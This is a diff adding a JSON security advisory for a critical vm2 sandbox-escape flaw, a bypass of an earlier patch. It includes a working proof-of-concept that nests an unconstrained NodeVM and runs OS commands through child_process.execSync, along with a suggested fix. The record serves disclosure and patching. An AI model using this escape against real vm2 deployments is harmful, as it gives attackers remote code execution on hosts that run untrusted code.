@@ -1,0 +1,59 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-29T17:50:24Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 359354,
+    "Id": "GSA_kwCzR0hTQS1tNHd4LW02NXgtZ2hycs4ABXu6",
+    "GhsaId": "GHSA-m4wx-m65x-ghrr",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-m4wx-m65x-ghrr"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/01a7552add345d5a6862623884e6b79a85bf0568"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/86ab819f202c3a8dad88cef5705f2e416c5188d7"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-m4wx-m65x-ghrr"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-m4wx-m65x-ghrr"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-47137"
+      }
+    ],
+    "Description": "## Summary\n\nThe fix for GHSA-8hg8-63c5-gwmx (CVE-2023-37903) introduced a check in `nodevm.js` line 263 that blocks the combination `nesting: true` + `require: false`. However, the check uses strict equality (`options.require === false`), which is trivially bypassed by omitting the `require` option entirely.\n\nWhen `require` is not specified, `options.require` is `undefined`, not `false`. The strict equality check fails, so the security guard is skipped. Immediately after (line 280), the destructuring default `require: requireOpts = false` assigns `requireOpts = false`, producing the exact configuration the patch was designed to prevent.\n\n## Root Cause\n\n```javascript\n// nodevm.js:263 — the security check\nif (options.nesting === true \u0026\u0026 options.require === false) {\n    throw new VMError('...');\n}\n// nodevm.js:280 — the default assignment (AFTER the check)\nconst { require: requireOpts = false } = options;\n// When options.require is undefined:\n//   - Line 263: undefined === false → FALSE → check skipped\n//   - Line 280: requireOpts = false → same as require:false\n```\n\n## Impact\n\nFull Remote Code Execution on the host system. An attacker running code inside a `NodeVM({ nesting: true })` sandbox (without specifying `require`) can:\n\n1. `require('vm2')` to get the vm2 library\n2. Construct an inner `NodeVM` with `require: { builtin: ['child_process'] }`\n3. Execute arbitrary OS commands via `child_process.execSync`\n\nThe inner VM is completely unconstrained by the outer sandbox configuration.\n\n## Reproduction\n\n```javascript\nconst { NodeVM } = require('vm2');\n\n// nesting:true, require not specified (defaults to false AFTER the check)\nconst nvm = new NodeVM({ nesting: true });\n\nconst result = nvm.run(`\n  const { NodeVM } = require('vm2');\n  const inner = new NodeVM({\n    require: { builtin: ['child_process'] }\n  });\n  module.exports = inner.run(\n    \"module.exports = require('child_process').execSync('id').toString()\",\n    'exploit.js'\n  );\n`, 'exploit.js');\n\nconsole.log(result); // prints host uid/gid — full RCE\n```\n\n## Suggested Fix\n\n```javascript\n// Change the check to catch both false and undefined/omitted:\nif (options.nesting === true \u0026\u0026 !options.require) {\n    throw new VMError('...');\n}\n```\n\nOr move the check after the destructuring default assignment:\n\n```javascript\nconst { require: requireOpts = false } = options;\nif (options.nesting === true \u0026\u0026 !requireOpts) {\n    throw new VMError('...');\n}\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-29T17:50:22Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 has a CVE-2023-37903 patch bypass: nesting:true without explicit require still allows full RCE",
+    "UpdatedAt": "2026-05-29T17:50:24Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.4"
+      },
+      "VulnerableVersionRange": "\u003c= 3.11.3"
+    }
+  ]
+}
